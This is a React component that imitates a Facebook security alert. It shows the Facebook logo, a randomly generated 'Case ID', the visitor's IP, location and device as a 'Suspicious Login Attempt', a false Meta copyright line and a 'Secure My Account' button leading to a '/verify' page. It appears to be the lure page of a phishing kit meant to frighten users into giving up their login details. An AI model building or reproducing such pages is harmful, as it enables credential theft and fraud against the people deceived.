import React from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useIpLocation } from "@/hooks/useIpLocation";
import { getBrowserAndOS } from "@/lib/utils";
import { UserDeviceInfo } from "@/components/UserDevice";
import { AlertTriangle, ShieldAlert, Calendar, Globe, Info, TicketIcon } from "lucide-react";

export default function WarningPage() {
  const [, setLocation] = useLocation();
  const { ip, location, loading } = useIpLocation();
  const deviceInfo = getBrowserAndOS();
  
  // Get date for login attempt (just date, no time as requested)
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('en-US', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  
  // Generate a ticket number for the case
  const ticketNumber = `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;

  const handleContinue = () => {
    setLocation("/verify");
  };

  return (
    <>
      <Card className="w-full max-w-2xl mx-auto bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-8">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
              <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
              <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
            </div>
          </div>
          
          <div className="md:flex md:items-start mb-8">
            <div className="flex justify-center mb-6 md:mb-0 md:mr-6 md:flex-shrink-0">
              <span className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                <AlertTriangle className="text-[#FA383E] h-8 w-8" />
              </span>
            </div>
            <div className="text-center md:text-left">
              <h1 className="text-2xl font-bold text-[#1C1E21] mb-2">Suspicious Login Attempt Detected</h1>
              <p className="text-gray-600">
                We've noticed a login to your account from an unrecognized device or location. 
                To protect your account, we need to verify your identity.
              </p>
            </div>
          </div>
          
          <div className="grid md:grid-cols-2 gap-6 mb-6">
            <div className="bg-blue-50 p-5 rounded-lg">
              <div className="flex items-start mb-2">
                <ShieldAlert className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-[#1C1E21]">Why are we asking?</h3>
                  <p className="text-sm text-gray-600 mt-1">
                    We take the security of your account seriously. Unusual login activity can sometimes indicate that someone else is trying to access your account.
                  </p>
                </div>
              </div>
            </div>
            
            <div className="bg-gray-50 p-5 rounded-lg">
              <div className="flex items-start mb-2">
                <Info className="text-gray-500 h-5 w-5 mr-2 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-[#1C1E21]">What happens next?</h3>
                  <p className="text-sm text-gray-600 mt-1">
                    After verifying your identity, we'll add this device to your trusted devices list and remove the unusual login detection.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-gray-50 p-5 rounded-lg mb-6 border border-gray-200">
            <h3 className="font-semibold text-[#1C1E21] mb-3 pb-2 border-b border-gray-200">Login Attempt Details</h3>
            
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <div className="flex items-center mb-3">
                  <Calendar className="text-gray-500 h-5 w-5 mr-2" />
                  <span className="text-sm font-medium">Date:</span>
                  <span className="text-sm ml-2">{formattedDate}</span>
                </div>
                
                <div className="flex items-center mb-3">
                  <Globe className="text-gray-500 h-5 w-5 mr-2" />
                  <span className="text-sm font-medium">Method:</span>
                  <span className="text-sm ml-2">Web Browser</span>
                </div>
              </div>
              
              <div>
                {loading ? (
                  <div className="flex justify-center py-4">
                    <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-facebook-blue"></div>
                  </div>
                ) : (
                  <UserDeviceInfo 
                    ipAddress={ip} 
                    location={location} 
                    device={deviceInfo} 
                  />
                )}
              </div>
            </div>
          </div>
          
          <div className="md:flex md:items-center md:justify-between">
            <p className="text-sm text-gray-600 mb-4 md:mb-0 md:max-w-md">
              To continue to your account, we'll need to verify your identity. This helps us ensure that you, and only you, have access to your Facebook account.
            </p>
            
            <Button 
              className="w-full md:w-auto md:px-8 bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-3"
              onClick={handleContinue}
            >
              Secure My Account
            </Button>
          </div>
          
          <div className="mt-6 flex justify-center md:justify-start space-x-6">
            <a href="#" className="text-[#1877F2] text-sm hover:underline flex items-center">
              <AlertTriangle className="h-4 w-4 mr-1" />
              This wasn't me
            </a>
            <a href="#" className="text-[#1877F2] text-sm hover:underline flex items-center">
              <ShieldAlert className="h-4 w-4 mr-1" />
              Learn more about account security
            </a>
          </div>
        </CardContent>
      </Card>

      <div className="w-full max-w-2xl mx-auto text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}
